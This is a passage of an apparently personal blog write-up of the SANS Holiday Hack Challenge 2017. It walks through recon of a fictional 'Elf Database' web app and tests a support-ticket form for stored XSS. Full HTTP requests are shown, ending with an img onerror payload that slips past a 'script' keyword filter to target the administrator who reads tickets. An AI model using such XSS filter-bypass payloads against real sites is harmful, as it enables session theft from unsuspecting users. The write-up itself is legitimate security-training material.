&lt;img alt="we_re_off_to_see_the_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/we_re_off_to_see_the_snowball.gif" /&gt;
&lt;p&gt;Having completed this level, we have a little chat with a certain someone:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Glinda the Good Witch:&lt;/strong&gt; It's me, Glinda the Good Witch of Oz! You found
me and ruined my genius plan!&lt;/p&gt;
&lt;p&gt;You see, I cast a magic spell on the Abominable Snow Monster to make him
throw all the snowballs at the North Pole. Why? Because I knew a giant
snowball fight would stir up hostilities between the Elves and the
Munchkins, resulting in all-out WAR between Oz and the North Pole. I was
going to sell my magic and spells to both sides. War profiteering would
mean GREAT business for me.&lt;/p&gt;
&lt;p&gt;But, alas, you and your sleuthing foiled my venture. And I would have
gotten away with it too, if it weren't for you meddling kids!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;My, oh my, what a nasty plan!&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="north-pole-christmas-town-infrastructure-elf-database"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id58"&gt;North Pole Christmas Town infrastructure: Elf Database&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;On to the last application, the Elf Database. Given the name, we can expect the
application to be some sort of web interface allowing us to have access to the
list of North Pole's elves.&lt;/p&gt;
&lt;p&gt;Once again, if we try to connect using Alabaster's account, we get an
&lt;code&gt;Incorrect username or password!&lt;/code&gt; error.&lt;/p&gt;
&lt;img alt="edb_login_fail.png" class="align-center" src="/images/sans-christmas-challenge-2017/edb_login_fail.png" /&gt;
&lt;p&gt;So, let's see what we can find from basic recon. Once again, we get some
information by taking a look at the &lt;code&gt;robots.txt&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/robots.txt&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;edb.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SESSION=5A0K85HFazf2m0ltjg3g&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.3&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sun, 07 Jan 2018 23:02:46 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/plain; charset=utf-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Last-Modified&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Tue, 15 Aug 2017 04:58:06 GMT&lt;/span&gt;

User-agent: *
Disallow: /dev
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, there is a &lt;code&gt;/dev&lt;/code&gt; directory. If we browse to it, we find only one
file, &lt;code&gt;LDIF_template.txt&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/dev/LDIF_template.txt&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;edb.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;1&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SESSION=5A0K85HFazf2m0ltjg3g&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.3&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sun, 07 Jan 2018 23:04:47 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/plain; charset=utf-8&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;751&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Ranges&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;bytes&lt;/span&gt;

#LDAP LDIF TEMPLATE

dn: dc=com
dc: com
objectClass: dcObject

dn: dc=northpolechristmastown,dc=com
dc: northpolechristmastown
objectClass: dcObject
objectClass: organization

dn: ou=human,dc=northpolechristmastown,dc=com
objectClass: organizationalUnit
ou: human

dn: ou=elf,dc=northpolechristmastown,dc=com
objectClass: organizationalUnit
ou: elf

dn: ou=reindeer,dc=northpolechristmastown,dc=com
objectClass: organizationalUnit
ou: reindeer

dn: cn= ,ou= ,dc=northpolechristmastown,dc=com
objectClass: addressbookPerson
cn:
sn:
gn:
profilePath: /path/to/users/profile/image
uid:
ou:
department:
mail:
telephoneNumber:
street:
postOfficeBox:
postalCode:
postalAddress:
st:
l:
c:
facsimileTelephoneNumber:
description:
&lt;span class="hll"&gt;userPassword:
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This gives us some info about how the Elf Database application functions.
There's obviously an LDAP backend. We also have the list of attributes for the
object representing the users, including one which seems particularly juicy,
&lt;code&gt;userPassword&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Learning that the application uses an LDAP backend, I tried to bypass
authentication using LDAP injection, but it did not work. So, let's take a look
at the source code of the application. Here's what we can find on the
&lt;code&gt;index.html&lt;/code&gt; page:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;href&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;            &lt;span class="nx"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;localStorage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getItem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;np-auth&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;                &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/login&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;auth_token&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;token&lt;/span&gt; &lt;span class="p"&gt;}).&lt;/span&gt;&lt;span class="nx"&gt;done&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;bool&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                        &lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;href&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;link&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                    &lt;span class="p"&gt;}&lt;/span&gt;
                &lt;span class="p"&gt;})&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, a token stored in the local storage, under the key &lt;code&gt;np-auth&lt;/code&gt; seems
to be used for the application session management. Let's keep digging.&lt;/p&gt;
&lt;p&gt;Under the login form, there's a support link, where you can send a password
reset request to an administrator. Since we have access to Alabaster's email
account, let's try and reset his password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/service&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;edb.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;Origin&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://edb.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;X-Requested-With&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;XMLHttpRequest&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SESSION=6S6Nd58Sy85OK09ui063&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

uid=alabaster.snowball&amp;amp;email=alabaster.snowball%40northpolechristmastown.com&amp;amp;message=I+forgot+my+password!
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.3&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sun, 07 Jan 2018 23:20:45 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;115&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;bool&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;link&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/reset_request?ticket=OYHAT-T8XZR-EC2YB-U0173&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Request Submitted. Redirecting...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now that our password reset request was sent, let's check Alabaster's email!
Hmm, nothing. Let's see what happened after our request was sent. We get
redirected to a support ticket page:&lt;/p&gt;
&lt;img alt="edb_request_normal.png" class="align-center" src="/images/sans-christmas-challenge-2017/edb_request_normal.png" /&gt;
&lt;p&gt;And our message is embedded in the page. Is it possible that they forgot to
sanitize our user input? Let's try to inject some special characters:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/service&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;edb.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;Origin&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://edb.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;X-Requested-With&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;XMLHttpRequest&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://edb.northpolechristmastown.com/index.html&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SESSION=53LByIBB8Ct5Z79RdsTC&lt;/span&gt;

uid=alabaster.snowball&amp;amp;email=alabaster.snowball%40northpolechristmastown.com&amp;amp;message=&amp;lt;u&amp;gt;Pretty+underlined+message&amp;lt;/u&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, if we take a look at our ticket page, we can see that the &lt;code&gt;&amp;lt;u&amp;gt;&lt;/code&gt; tag
was rendered, and my message appears underlined:&lt;/p&gt;
&lt;img alt="edb_request_underlined.png" class="align-center" src="/images/sans-christmas-challenge-2017/edb_request_underlined.png" /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;tr&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;td&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Alabaster&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;td&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;td&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Snowball&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;td&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;td&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;alabaster.snowball@northpolechristmastown.com&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;td&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;td&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;123-456-7890&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;td&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;td&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;u&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Pretty underlined message&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;u&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;td&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;tr&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;tbody&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This means that we can try to perform an XSS attack against the administrator
that will visualize our request! I usually use tags like &lt;code&gt;&amp;lt;u&amp;gt;&lt;/code&gt; or
&lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt; when testing for XSS, because they're usually not picked up by
WAFs or by custom implemented filters. And indeed, if we take a look at the
&lt;code&gt;custom.js&lt;/code&gt; file, we can see that there's some filtering done on the
client side to trigger on text like &lt;code&gt;script&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// --------------------------Customer Service Request -----------------------------/&lt;/span&gt;
&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#help_button&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;click&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;preventDefault&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;help_uid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#help_uid&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;val&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;help_email&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#help_email&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;val&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;help_message&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#help_message&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;val&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;help_uid&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/^\w+\.\w+$/g&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;help_email&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/^[\w\_\-\.]+\@[\w\_\-\.]+\.\w\w\w?\w?$/g&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;help_message&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/^.+$/g&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;help_message&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/[sS][cC][rR][iI][pP][tT]/g&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, client-side verifications can be bypassed easily by performing the HTTP
request directly. But in that case, the check (among others) was also performed
on the server-side.&lt;/p&gt;
&lt;p&gt;So, let's use another type of XSS payload, that does not involve the word
&lt;code&gt;script&lt;/code&gt;. One of the most common is to use the &lt;code&gt;onerror&lt;/code&gt; attribute.
Let's try and see:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/service&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;edb.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;Origin&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://edb.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;X-Requested-With&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;XMLHttpRequest&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://edb.northpolechristmastown.com/index.html&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SESSION=53LByIBB8Ct5Z79RdsTC&lt;/span&gt;

uid=alabaster.snowball&amp;amp;email=alabaster.snowball%40northpolechristmastown.com&amp;amp;message=&amp;lt;img src=x onerror=&amp;quot;alert(&amp;#39;Huh oh, Spaghettios&amp;#39;)&amp;quot; /&amp;gt;
